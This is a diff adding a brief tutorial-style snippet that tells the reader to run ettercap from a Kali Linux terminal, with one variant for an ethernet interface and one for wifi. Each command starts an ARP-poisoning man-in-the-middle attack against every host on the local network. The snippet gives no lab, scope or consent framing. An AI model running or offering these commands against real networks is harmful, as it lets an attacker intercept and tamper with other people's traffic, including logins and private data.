@@ -1,0 +1,5 @@
+At Kali Linux, go to the terminal and type the following command -:
+
+ettercap -T -q -M arp -i eth0 /// ///      (for ethernet)
+
+ettercap -T -q -M arp -i wlan0 /// ///      (for wifi or WLAN)
